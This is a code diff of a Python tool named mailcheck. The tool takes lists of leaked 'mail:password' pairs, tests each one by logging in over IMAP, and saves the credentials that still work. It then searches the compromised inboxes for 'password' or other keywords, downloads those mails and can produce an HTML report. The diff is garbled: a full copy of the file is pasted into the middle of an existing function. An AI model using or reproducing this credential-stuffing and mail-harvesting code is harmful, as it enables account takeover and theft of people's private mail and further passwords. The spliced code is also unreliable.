@@ -29,8 +29,51 @@ def mailcheck(file, server, out,searchpasswords,search):
     3. mailcheck --file validmails.txtt --server mail.domain.com --searchpasswords
     """
     credentials = {}
+    users = []import click
+import imapclient
+import pyzmail
+import pprint
+import os
+from jinja2 import Environment, FileSystemLoader
+import datetime
+from createhtml import createhtml
+
+@click.option('--file' , prompt=True, help='Input fileName. Format : "mail:password"')
+@click.option('--server', prompt=True, help='IMAP server address')
+@click.option('--out', default='out.txt', help='OPTIONAL default:out.txt Output fileName')
+@click.option('--searchpasswords', default='False', help='OPTIONAL If True checks for password in this mailbox and retrieves mails')
+@click.option('--search', default='', help='OPTIONAL Search in this mailbox and retrieves mails with this word')
+@click.option('--html' , default='False', help='If True generates an html report. Works only if --search or --searchpassword used')
+
+@click.command()
+def mailcheck(file, server, out,searchpasswords,search,html):
+    """
+    A little mail tool that checks if a list of usernames:password is still valid. It outputs by default to out.txt the
+    working ones.
+    You can add the option --searchpasswords to check in a mailbox if the word password is present and retrieves them all.
+    You can do a custom search too with --search <word>.
+    Examples:
+
+    1. mailcheck --file listpawned.txt --server mail.domain.com --out validmails.txt
+
+    2. mailcheck --file validmails.txtt --server mail.domain.com --search invoice
+
+    3. mailcheck --file validmails.txtt --server mail.domain.com --searchpasswords
+    """
+
+    template_vars = {"title": "MailCheck ",
+                     "search": "",
+                     "current": "",
+                     "users": {}
+                     }
+
+
+
+    #template_vars["users"] = {}
+    credentials = {}
     users = []
     good = {}
+    datescantime = datetime.datetime.now().strftime("%y-%m-%d-%H-%M")
     with open(file, 'r') as f:
         for line in f:
             user, pwd = line.strip().split(':')
@@ -44,21 +87,23 @@ def mailcheck(file, server, out,searchpasswords,search):
             imapObj = imapclient.IMAPClient(server, ssl=True)
             imapObj.login(user, credentials[user])
             imapObj.select_folder('INBOX', readonly=True)
-            click.echo("GOOD !!!" + user + " : " + credentials[user])
+            #click.echo("GOOD !!!" + user + " : " + credentials[user])
             good[user] = credentials[user]
+            template_vars["users"][user] = {}
+            template_vars["users"][user]['password'] = credentials[user]
 
             if search != '':
                 UIDs = imapObj.search([u'TEXT', search])
                 folder = search
                 if UIDs:
-                    downmails(user,imapObj,UIDs,folder)
+                    downmails(user,imapObj,UIDs,folder,datescantime)
 
             if searchpasswords == 'True':
                 UIDs = imapObj.search([u'TEXT', 'password'] )
                 folder = 'passwords'
 
                 if UIDs:
-                    downmails(user,imapObj,UIDs,folder)
+                    downmails(user,imapObj,UIDs,folder,datescantime)
 
             imapObj.logout()
 
@@ -72,16 +117,25 @@ def mailcheck(file, server, out,searchpasswords,search):
         print(user+" : "+credentials[user])
 
         with open(out, 'a') as the_file:
-            the_file.write(user+" : "+credentials[user]+"\n")
+            the_file.write(user+":"+credentials[user]+"\n")
+
+    if html == 'True' and (search != '' or searchpasswords == 'True'):
+
+        createhtml(searchpasswords,search,template_vars,users,datescantime)
 
 
+def downmails(user,imapObj,UIDs,folder,datescantime):
 
-def downmails(user,imapObj,UIDs,folder):
-    newpath = r'.\\'+user
+
+    folderdate = r'.\\' + str(datescantime)
+    if not os.path.exists(folderdate):
+        os.makedirs(folderdate)
+
+    newpath = r'.\\'+ folderdate + '\\' + user
     if not os.path.exists(newpath):
         os.makedirs(newpath)
 
-    newpathuser = r'.\\'+user + r'\\' + folder
+    newpathuser = r'.\\'+ folderdate + '\\' + user + r'\\' + folder
     if not os.path.exists(newpathuser):
         os.makedirs(newpathuser)
 
